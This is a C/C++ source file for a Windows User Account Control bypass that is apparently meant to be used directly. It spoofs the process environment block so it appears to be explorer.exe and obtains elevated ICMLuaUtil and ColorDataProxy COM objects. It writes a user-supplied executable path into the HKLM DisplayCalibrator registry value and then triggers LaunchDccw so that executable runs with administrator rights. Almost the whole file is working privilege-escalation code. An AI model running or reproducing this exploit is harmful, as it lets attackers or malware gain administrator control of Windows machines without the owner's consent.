/* Exploits undocumented elevated COM interface ICMLuaUtil via process spoofing to edit registry
 then calls ColorDataProxy to trigger UAC bypass. Win 7 & up. */
#include <windows.h>
#include <commctrl.h>
#include "ntos.h" // ntdll header
//#include <winternl.h>
//#include <winnt.h>
#include <objbase.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include "ICMLuaUtil.h"
#include "IColorDataProxy.h"

#pragma comment(lib,"Ole32.lib") 

// globals for callback and module
PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

/* enumerate modules callback handler */
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    PPEB Peb = NtCurrentPeb();
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

int main(int argc, char* argv[])
{
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    ICMLuaUtil* CMLuaUtil = NULL;
    IColorDataProxy* ColorDataProxy = NULL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    PPEB Peb = NtCurrentPeb();
    BIND_OPTS3 bop;
    LPWSTR pCMDpath;
    size_t sSize;
    if (argc < 2) {
        printf("No EXE supplied! Re-run the file and supply a EXE on disk as the first argument!\n");
        return 1;
    }
    pCMDpath = new WCHAR[MAX_PATH + 1];
    mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], MAX_PATH);
    RtlAcquirePebLock();
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        wcscpy(ImageFileName, L"c:\\Windows\\");
        wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        wcscpy(CommandLine, L"explorer.exe");
    }
    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    RtlReleasePebLock();
    // finished spoofing the PEB for elevated COM access
    printf("Successfully spoofed PEB for explorer.exe\n");

    hInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    do {
        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_LOCAL_SERVER;
        wcscpy(szMoniker, L"Elevation:Administrator!new:");
        wcscat(szMoniker, T_CLSID_CMSTPLUA);
        REFIID riid = reinterpret_cast<const IID&>(IID_ICMLuaUtil);
        hRes = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
    } while (FALSE);
    printf("Successfully created elevated CMLuaUtil COM object\n");
    CMLuaUtil = (ICMLuaUtil*)ElevatedObject;
    // set the payload into the registry key via privileged CMLuaUtil.
    wchar_t key[100] = L"DisplayCalibrator";
    wchar_t keyPath[100] = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration";
    hRes = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,HKEY_LOCAL_MACHINE, keyPath, key, pCMDpath);
    //hRes = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator", pCMDpath);
    if (hRes == 0) {
        printf("Successfully set DisplayCalibrator registry key to supplied exe\n");
    } else {
        printf("Failed to set DisplayCalibrator registry key!\n");
        return 1;
    }
    // elevate the proxy dll and call it.
    do {
        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_LOCAL_SERVER;
        wcscpy(szMoniker, L"Elevation:Administrator!new:");
        wcscat(szMoniker, T_CLSID_ColorDataProxy);
        REFIID riid = reinterpret_cast<const IID&>(IID_IColorDataProxy);
        hRes = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject2);
    } while (FALSE);
    printf("Successfully created elevated IColorDataProxy COM object\n");
    ColorDataProxy = (IColorDataProxy*)ElevatedObject2;
    printf("Calling LaunchDccw method from the elevated IColorDataProxy COM object...\n");
    hRes = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
    if (hRes == 0) {
        printf("LaunchDccw executed successfully!\n");
    } else {
        printf("LaunchDccw failed to execute!\n");
        return 1;
    }

    free(pCMDpath);

    // delete the key & free the objects
    hRes = CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil, HKEY_LOCAL_MACHINE, keyPath, key);
    //hRes = CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil, HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator");
    // clean up
    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }
    if (ColorDataProxy != NULL) {
        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
    }
    if (hInit == S_OK)
        CoUninitialize();

    return 0;
}
